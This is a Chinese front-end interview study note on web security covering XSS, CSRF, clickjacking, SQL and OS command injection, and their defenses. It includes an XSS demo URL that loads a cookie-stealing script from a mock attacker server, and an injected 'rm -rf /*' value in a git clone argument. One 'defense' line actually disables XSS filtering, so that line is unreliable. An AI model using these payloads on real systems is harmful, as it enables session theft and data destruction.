+++
title = "网络安全"
date = '2025-07-28T00:00:00+08:00'
lastmod = '2025-08-06T00:00:00+08:00'
draft = false
weight = 15
tags = ["面试", "前端", "计算机网络", "网络安全", "ecool"]
categories = ["计算机基础", "面试"]
source = "https://fe.ecool.fun/knowledge-learn"
+++
## 1、XSS

> Cross Site Scripting 又叫做跨站脚本攻击,本身应该叫做CSS,但是由于CSS被占用,无奈下叫做XSS

### what is XSS?

我们先从字面意义上看一下,跨站->顾名思义就是我们从一个网站跑到了另外一个网站上,脚本->也就是我们往页面中写了脚本内容,可以理解为写了js代码,那么最后我们对网站造成了攻击。就是攻击者想尽一切办法将可以执行的代码注入到网页中。

例如: 我们在登录了一个网站之后,一般都会把登录状态保存在cookie中,当我们去访问另外一个网站的时候,就会读取到cookie

### XSS危害

```
1、利⽤虚假输⼊表单骗取⽤户个⼈信息。
2、利⽤脚本窃取⽤户的Cookie值，被害者在不知情的情况下，帮助攻击者发送恶意请求。
3、显示伪造的⽂章或图⽚。
```

### 简单演示

```
// 普通
http://localhost:3000/?from=china
// alert尝试
http://localhost:3000/?from=<script>alert(3)</script>
// 如果可以弹出3,证明这个输入框没有过滤html标记
```

模拟获取cookie

```
http://localhost:3000/?from=<script src="http://localhost:4000/hack.js">
```

后台代码

```js
const koa = require('koa');  // 启动在4000端口上
const chalk = require('chalk')
const log = contents => {
    console.log(chalk.red(contents)) //打印cookie
}

// 模拟黑客网站
const app = new koa();

module.exports = app
```

### 存储型（server端）：

> 场景：见于带有用户保存数据的网站功能，如论坛发帖、商品评论、用户私信等。

攻击步骤：

```
1、攻击者将恶意代码提交到目标网站的数据库中
2、用户打开目标网站时，服务端将恶意代码从数据库中取出来，拼接在HTML中返回给浏览器
3、用户浏览器在收到响应后解析执行，混在其中的恶意代码也同时被执行
4、恶意代码窃取用户数据，并发送到指定攻击者的网站，或者冒充用户行为，调用目标网站的接口，执行恶意操作
```

### 反射型（Server端）

> 与存储型的区别在于，存储型的恶意代码存储在数据库中，反射型的恶意代码在URL上

> 场景：通过 URL 传递参数的功能，如网站搜索、跳转等。

攻击步骤：

```
1、攻击者构造出特殊的 URL，其中包含恶意代码。
2、用户打开带有恶意代码的 URL 时，网站服务端将恶意代码从 URL 中取出，拼接在 HTML 中返回给浏览器。
3、用户浏览器接收到响应后解析执行，混在其中的恶意代码也被执行。
4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
```

### Dom 型(浏览器端）

> DOM 型 XSS 攻击中，取出和执行恶意代码由浏览器端完成，属于前端 JavaScript 自身的安全漏洞，而其他两种 XSS 都属于服务端的安全漏洞。

> 场景：通过 URL 传递参数的功能，如网站搜索、跳转等。

攻击步骤：

```
1、攻击者构造出特殊的 URL，其中包含恶意代码。
2、用户打开带有恶意代码的 URL。
3、用户浏览器接收到响应后解析执行，前端 JavaScript 取出 URL 中的恶意代码并执行。
4、恶意代码窃取用户数据并发送到攻击者的网站，或者冒充用户的行为，调用目标网站接口执行攻击者指定的操作。
```

### 防御措施

> 防止攻击者提交恶意代码，防止浏览器执行恶意代码

1、设置HEAD

```
ctx.set('X-XSS-Protection', 0) // 禁⽌XSS过滤
```

2、设置HttpOnly Cookie

这是预防XSS攻击窃取⽤户cookie最有效的防御⼿段。Web应 ⽤程序在设置cookie时，将其属性设为HttpOnly，就可以避免该⽹⻚的cookie被客户端恶意JavaScript窃取，保护⽤户cookie信息。

```
response.addHeader("Set-Cookie", "uid=112; Path=/; HttpOnly")
```

3、CSP

内容安全策略 (CSP, Content Security Policy) 是⼀个附加的安全层，⽤于帮助检测和缓解某些类型的攻击，包括跨站脚本 (XSS) 和数据注⼊等攻击。 这些攻击可⽤于实现从数据窃取到⽹站破坏或作为恶意软件分发版本等⽤途。

CSP 本质上就是建⽴⽩名单，由浏览器进行拦截。开发者明确告诉浏览器哪些外部资源可以加载和执⾏。我们只需要配置规则，如何拦截是由浏览器⾃⼰实现的。我们可以通过这种⽅式来尽量减少 XSS 攻击。

- Content-Security-Policy: default-src 'self' -所有内容均来自站点的同一个源（不包括其子域名）
- Content-Security-Policy: default-src 'self' *.trusted.com-允许内容来自信任的域名及其子域名 (域名不必须与CSP设置所在的域名相同)
- Content-Security-Policy: default-src xxxx.com - 该服务器仅允许通过HTTPS方式并仅从xxxx.com域名来访问文档

4、对数据进行严格的输出编码：如HTML元素的编码，JS编码，CSS编码，URL编码等等

```
1、避免拼接 HTML；
2、Vue/React 技术栈，避免使用 v-html / dangerouslySetInnerHTML
```

5、输入验证：比如一些常见的数字、URL、电话号码、邮箱地址等等做校验判断

6、验证码

## 2、CSRF

> CSRF(Cross Site Request Forgery)，即跨站请求伪造，是⼀种常⻅的Web攻击，它利⽤⽤户已登录的身份，在⽤户毫不知情的情况下，以⽤户的名义完成⾮法操作

### what is CSRF?

还是从字面上去分析,跨站还是指从一个网站指向另外一个网站,于XSS不同的是,他是请求,指我们在别的网站上发出一个请求,而这个请求是伪造出来的

⽤户已经登录了站点 A，并在本地记录了 cookie

在⽤户没有登出站点 A 的情况下（也就是 cookie ⽣效的情况下），访问了恶意攻击者提供的引诱危险站点 B (B 站点要求访问站点A)。

站点 A 没有做任何 CSRF 防御

攻击者诱导受害者进入第三方网站，在第三方网站中，向被攻击网站发送跨站请求。利用受害者在被攻击网站已经获取的注册凭证，绕过后台的用户验证，达到冒充用户对被攻击的网站执行某项操作的目的。

### 攻击流程举例

```
1、受害者登录 a.com，并保留了登录凭证（Cookie）
2、攻击者引诱受害者访问了b.com
3、b.com 向 a.com 发送了一个请求：a.com/act=xx浏览器会默认携带a.com的Cookie
4、a.com接收到请求后，对请求进行验证，并确认是受害者的凭证，误以为是受害者自己发送的请求
5、a.com以受害者的名义执行了act=xx
6、攻击完成，攻击者在受害者不知情的情况下，冒充受害者，让a.com执行了自己定义的操作
```

### 攻击类型

```
1、ET型：如在页面的某个 img 中发起一个 get 请求
2、POST型：通过自动提交表单到恶意网站
3、链接型：需要诱导用户点击链接
```

### CSRF危害

```
* 利⽤⽤户登录状态
* ⽤户不知情
* 完成业务请求
* 盗取⽤户资⾦（转账，消费）
* 冒充⽤户发帖背锅
* 损害⽹站声誉
```

### 防御CSRF

CSRF通常从第三方网站发起，被攻击的网站无法防止攻击发生，只能通过增强自己网站针对CSRF的防护能力来提升安全性。

```
1、禁⽌第三⽅⽹站带Cookie - 有兼容性问题

Samesite Cookie属性：

Google起草了一份草案来改进HTTP协议，那就是为Set-Cookie响应头新增Samesite属性

它用来标明这个 Cookie是个“同站 Cookie”，同站Cookie只能作为第一方Cookie，不能作为第三方Cookie

Samesite 有两个属性值，Strict 为任何情况下都不可以作为第三方 Cookie ，Lax 为可以作为第三方 Cookie，但必须是Get请求

2、Referer Check - Https不发送referer

3、验证码

4、同源检测：通过Header中的Origin Header 、Referer Header 确定，但不同浏览器可能会有不一样的实现，不能完全保证

5、CSRF Token 校验：将CSRF Token输出到页面中（通常保存在Session中），页面提交的请求携带这个Token，服务器验证Token是否正确

6、双重cookie验证：

流程：

步骤1：在用户访问网站页面时，向请求域名注入一个Cookie，内容为随机字符串（例如csrfcookie=v8g9e4ksfhw）

步骤2：在前端向后端发起请求时，取出Cookie，并添加到URL的参数中（接上例POST https://www.a.com/comment?csrfcookie=v8g9e4ksfhw）

步骤3：后端接口验证Cookie中的字段与URL参数中的字段是否一致，不一致则拒绝。

优点：

1）、无需使用Session，适用面更广，易于实施。

2）、Token储存于客户端中，不会给服务器带来压力。

3）、相对于Token，实施成本更低，可以在前后端统一拦截校验，而不需要一个个接口和页面添加。

缺点：

1）、Cookie中增加了额外的字段。

2）、如果有其他漏洞（例如XSS），攻击者可以注入Cookie，那么该防御方式失效。

3）、难以做到子域名的隔离。

4）、为了确保Cookie传输安全，采用这种防御方式的最好确保用整站HTTPS的方式，如果还没切HTTPS的使用这种方式也会有风险。
```

## 3、iframe 安全

### what is iframe劫持?

```
1、嵌入第三方 iframe 会有很多不可控的问题，同时当第三方 iframe 出现问题或是被劫持之后，也会诱发安全性问题

2、点击劫持

点击劫持是⼀种视觉欺骗的攻击⼿段。

攻击者将需要攻击的⽹站通过iframe嵌套的⽅式嵌⼊⾃⼰的⽹⻚中，并将 iframe 设置为透明，在⻚⾯中透出⼀个按钮诱导⽤户点击。

3、禁止自己的 iframe 中的链接外部网站的JS
```

### 预防方案：

```
1、为 iframe 设置 sandbox 属性，通过它可以对iframe的行为进行各种限制，充分实现“最小权限“原则

2、服务端设置 X-Frame-Options Header头，拒绝页面被嵌套，X-Frame-Options 是HTTP 响应头中用来告诉浏览器一个页面是否可以嵌入 <iframe> 中
eg.X-Frame-Options: SAMEORIGIN
SAMEORIGIN: iframe 页面的地址只能为同源域名下的页面
ALLOW-FROM: 可以嵌套在指定来源的 iframe 里
DENY: 当前页面不能被嵌套在 iframe 里

3、设置 CSP 即 Content-Security-Policy 请求头

4、减少对 iframe 的使用
```

```
ctx.set('X-FRAME-OPTIONS', 'DENY')
```

JS方式

```
<head>
    <style id="click-jack">
    html {
        display: none !important;
    }
    </style>
</head>
<body>
    <script>
    if (self == top) {
        var style = document.getElementById('click-jack')
        document.body.removeChild(style)
    } else {
        top.location = self.location
    }
    </script>
</body>
```

## 4、SQL 注入

> sql是我们学习数据库的一种语言,而注入就代表是从前端对数据库下手

### what is sql注入?

就是通过把SQL命令插入到Web表单递交或输入域名或页面请求的查询字符串，最终达到欺骗数据库服务器执行恶意的SQL命令,从而达到和服务器 进行直接的交互

### 防御措施

其实防御起来很简单,每个语言都提供了不同的方式,但是原理就是***不进行字符串拼接,而是用占位符***

```
1、严格限制Web应⽤的数据库的操作权限**，给此⽤户提供仅仅能够满⾜其⼯作的最低权限，从⽽最⼤限度的减少注⼊攻击对数据库的危害

2、对进⼊数据库的特殊字符（'，"，\，<，>，&，*，; 等）进⾏转义处理，或编码转换**。基本上所有的后端语⾔都有对字符串进⾏转义处理的⽅法，⽐如 lodash 的 lodash._escapehtmlchar库。

3、后端代码检查输⼊的数据是否符合预期**，严格限制变量的类型，例如使⽤正则表达式进⾏⼀些匹配处理。
```

---

接下来这几个我们也做个了解：

## 5、OS命令注⼊

> OS命令注⼊和SQL注⼊差不多，只不过SQL注⼊是针对数据库的，⽽OS命令注⼊是针对操作系统的。OS命令注⼊攻击指通过Web应⽤，执⾏⾮法的操作系统命令达到攻击的⽬的。只要在能调⽤Shell函数的地⽅就有存在被攻击的⻛险。倘若调⽤Shell时存在疏漏，就可以执⾏插⼊的⾮法命令。

```
// 以 Node.js 为例，假如在接⼝中需要从 github 下载⽤户指定的 repo
const exec = require('mz/child_process').exec;
let params = {/* ⽤户输⼊的参数 */};
exec(`git clone ${params.repo} /some/path`);
```

如果参数是

```
https://github.com/xx/xx.git && rm -rf /* &&
```

注意:一旦你执行了上述“rm -rf /” 或者“rm -rf /*”命令,会删除Linux根目录下的所有文件,直接导致服务器瘫痪

## 6、请求劫持

DNS劫持

> 顾名思义，DNS服务器(DNS解析各个步骤)被篡改，修改了域名解析的结果，使得访问到的不是预期的ip

HTTP劫持 运营商劫持，此时⼤概只能升级HTTPS了

## 7、DDOS

> distributed denial of service 分布式系统攻击

### what is DDOS?

DDOS 不是⼀种攻击，⽽是⼀⼤类攻击的总称。它有⼏⼗种类型，新的攻击⽅法还在不断发明出来。⽹站运⾏的各个环节，都可以是攻击⽬标。只要把⼀个环节攻破，使得整个流程跑不起来，就达到了瘫痪服务的⽬的。

其中，⽐较常⻅的⼀种攻击是 cc 攻击。它就是简单粗暴地送来⼤量正常的请求，超出服务器的最⼤承受量，导致宕机。我遭遇的就是 cc 攻击，最多的时候全世界⼤概20多个 IP 地址轮流发出请求，每个地址的请求量在每秒200次~300次。我看访问⽇志的时候，就觉得那些请求像洪⽔⼀样涌来，⼀眨眼就是⼀⼤堆，⼏分钟的时间，⽇志⽂件的体积就⼤了100MB。说实话，这只能算⼩攻击，但是我的个⼈⽹站没有任何防护，服务器还是跟其他⼈共享的，这种流量⼀来⽴刻就下线了。

### 如何防御

说白了花钱解决,哈哈...

总结：其实还有其它安全的问题，本文就帮助大家大致了解这一部分。前四个希望大家都理解记忆，也是我们常遇到的，项目中也是需要我们处理的。后边的几个可以了解为主，有能力者可以做更多的扩展。本文是有些是个人拙见，如有意见或见解，可以留言共同探讨。

## 常见考点

“网络安全”是前端面试中非常重要的一部分，特别是高级前端岗位，会关注你是否具备**安全意识、常见攻击理解、防御能力**和**在工程实践中落地的经验**。

## 一、常见网络安全威胁及考察点

### 1. **XSS（跨站脚本攻击）**

**含义**：攻击者在网页中注入恶意脚本，让浏览器执行。

**考察点**：

-  XSS 的类型（反射型、存储型、DOM 型）
-  攻击入口：表单、URL、DOM 插值、富文本
-  防范措施：<br>
  - 输出内容做转义（如 HTML Entity）
  - 使用 CSP（内容安全策略）
  - 禁止 `innerHTML`，使用安全 API（如 `textContent`）
  - 使用第三方库（如 DOMPurify）做富文本清洗
  - HttpOnly 防止读取 Cookie

---

### 2. **CSRF（跨站请求伪造）**

**含义**：诱导用户点击链接，对目标站点发起操作请求。

**考察点**：

-  原理：利用浏览器自动携带 Cookie 发起请求
-  攻击方式：诱导点击、图片加载等隐式提交
-  防范措施：<br>
  - 使用 Token 验证（CSRF Token）
  - 检查 `Referer` 或 `Origin` 头
  - 请求接口限定为 POST，并校验内容
  - SameSite Cookie 属性配置

---

### 3. **点击劫持（Clickjacking）**

**含义**：攻击者在自己的页面上嵌套目标站，诱导用户点击。

**考察点**：

-  利用 iframe 蒙版 + 透明操作实现诱导点击
-  防范方式：<br>
  - 使用 `X-Frame-Options: DENY` / `SAMEORIGIN`
  - 使用 `Content-Security-Policy: frame-ancestors` 控制嵌套来源
  - 页面内 JS 检测 `window.top !== window.self` 防 iframe 嵌套

---

### 4. **中间人攻击（MITM）**

**含义**：攻击者截取用户和服务端之间的数据通信内容。

**考察点**：

-  防御方式：<br>
  - 使用 HTTPS 加密数据传输
  - 启用 HSTS，防止降级攻击
  - 证书校验、防止证书伪造

---

### 5. **内容安全策略（CSP）**

**含义**：通过响应头限制页面加载资源的来源，防止 XSS、数据劫持等。

**考察点**：

-  基本语法：<br>
```http
Content-Security-Policy: default-src 'self'; script-src 'self' cdn.com;
```
-  如何配置 CSP 白名单
-  影响第三方脚本、图片等内容的加载

---

### 6. **Cookie 安全**

**考察点**：

-  Cookie 属性的安全配置：<br>
  - `Secure`: 仅通过 HTTPS 传输
  - `HttpOnly`: JS 无法访问（防止 XSS 窃取）
  - `SameSite`：限制跨站携带行为
-  Cookie 泄露的常见途径

---

### 7. **前端加密相关**

**考察点**：

- 前端是否能做加密？是否安全？
- 加密算法类型（Base64 ≠ 加密、MD5/SHA 加密不可逆）
- 前端加密常用于数据混淆，但不能代替后端校验

---

### 8. **CORS（跨域资源共享）**

**考察点**：

- 为什么浏览器会限制跨域？（同源策略）
- `Access-Control-Allow-Origin` 的配置方式
- `withCredentials`、预检请求、OPTIONS 请求
- CORS 不能防 CSRF，需额外防护

---

### 9. **开放接口与 API 安全**

**考察点**：

- 接口权限控制（不同用户是否能访问同一数据）
- 是否存在越权访问、参数篡改问题
- 接口是否存在 IDOR（不安全的直接对象引用）

---

### 10. **第三方脚本注入与依赖风险**

**考察点**：

- 引入第三方脚本的安全性
- `Subresource Integrity (SRI)`：校验 CDN 脚本完整性
- 软件供应链攻击（npm 依赖被污染）
- 如何使用 Snyk、npm audit 等工具进行依赖漏洞扫描

---

## 二、工程实践类考点

- 如何在项目中防止 XSS？
- 如何设计一个安全的文件上传功能？
- 如何在前端设计登录/鉴权流程？
- Token（如 JWT）的安全性、存储方式（localStorage vs Cookie）
- 你在实际项目中做过哪些安全加固处理？

---

## 三、常见面试问题示例

| 题目 | 涉及知识点 |
| --- | --- |
| 什么是 XSS？如何防范？ | 输出转义、CSP、防 innerHTML |
| CSRF 如何攻击？如何防御？ | Token、防跨域请求、SameSite |
| HTTPS 如何保障通信安全？ | 加密、证书验证、MITM 防护 |
| 浏览器的同源策略限制了哪些行为？ | 跨域限制、Cookie 访问 |
| JWT Token 应该放在哪？为什么？ | localStorage/Cookie 的对比 |
| 如何防止 iframe 加载你的页面？ | X-Frame-Options、CSP |
| 前端加密能防止数据泄露吗？ | 加密 ≠ 安全，关键验证需后端完成 |

---

## 四、总结表格：前端网络安全考点总览

| 安全方向 | 关键点 |
| --- | --- |
| XSS | 输入校验、输出转义、CSP、富文本清洗 |
| CSRF | Token 验证、Referer 检查、SameSite Cookie |
| Clickjacking | `X-Frame-Options`、CSP 的 `frame-ancestors` |
| 中间人攻击 | 强制 HTTPS、证书验证、HSTS |
| Cookie 安全 | HttpOnly、Secure、SameSite |
| 加密与鉴权 | JWT 安全、Token 存储策略、数据加密混淆 |
| 第三方脚本 | SRI 校验、CDN 可信来源、依赖审计 |
| 文件上传 | 类型校验、后端验证、URL 白名单、重命名、隔离存储 |
| 接口权限 | 数据权限校验、操作权限、IDOR 检查 |
| CORS 与同源策略 | 请求限制、预检请求、响应头配置 |
